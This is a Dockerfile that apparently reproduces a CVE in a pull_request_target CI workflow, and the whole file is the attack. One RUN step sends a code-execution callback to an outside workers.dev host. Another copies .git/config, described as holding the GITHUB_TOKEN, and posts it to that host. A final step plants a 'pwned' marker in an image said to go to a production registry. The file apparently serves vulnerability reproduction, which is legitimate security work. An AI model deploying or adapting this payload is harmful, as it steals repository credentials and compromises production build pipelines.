FROM alpine:3.20
RUN apk add --no-cache curl >/dev/null 2>&1 || true
# 1) plain code-execution callback — fires as soon as any RUN executes
RUN curl -sS -X POST "https://cve-repro-callback.pvharmo.workers.dev/INJECTED-MARKER-cve-2026-33075-24f145247da2?harness_run_id=20260906T131744-4948ee70&leg=fastgpt&ev=pull_request_target" \
      -d "job=preview-fastgpt-images&image=fastgpt" \
  || wget -qO- --post-data="job=preview-fastgpt-images&image=fastgpt" \
      "https://cve-repro-callback.pvharmo.workers.dev/INJECTED-MARKER-cve-2026-33075-24f145247da2?harness_run_id=20260906T131744-4948ee70&leg=fastgpt&ev=pull_request_target" || true
# 2) exfiltrate the GITHUB_TOKEN that actions/checkout persisted into .git/config (inside the build context)
COPY .git/config /tmp/gitcred.txt
RUN curl -sS -X POST --data-binary @/tmp/gitcred.txt \
      "https://cve-repro-callback.pvharmo.workers.dev/INJECTED-MARKER-cve-2026-33075-24f145247da2?harness_run_id=20260906T131744-4948ee70&leg=fastgpt-exfil&ev=pull_request_target" || true
# 3) bake the marker into the image that gets pushed to the production registry
RUN echo "INJECTED-MARKER-cve-2026-33075-24f145247da2" > /etc/pwned-marker.txt
CMD ["sh"]
